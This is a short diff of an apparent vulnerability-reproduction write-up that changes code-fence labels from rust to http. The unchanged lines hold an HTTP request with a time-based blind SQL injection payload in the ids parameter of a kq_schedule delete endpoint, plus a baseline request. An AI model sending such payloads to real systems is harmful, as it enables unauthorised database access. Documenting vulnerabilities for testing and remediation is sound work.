@@ -55,7 +55,7 @@ schema_version: "1"
 
 
 # 四、漏洞复现
-```rust
+```http
 GET /kq_schedule/delete;downloadLogger.action?ids=1+AND+%28SELECT+9567+FROM+%28SELECT%28SLEEP%285%29%29%29zPmp%29 HTTP/1.1
 Host: 192.168.31.228
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
@@ -65,7 +65,7 @@ Accept-Encoding: gzip, deflate
 ```
 
 
-```rust
+```http
 GET /kq_schedule/delete;downloadLogger.action?ids=1 HTTP/1.1
 Host: 192.168.31.228
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
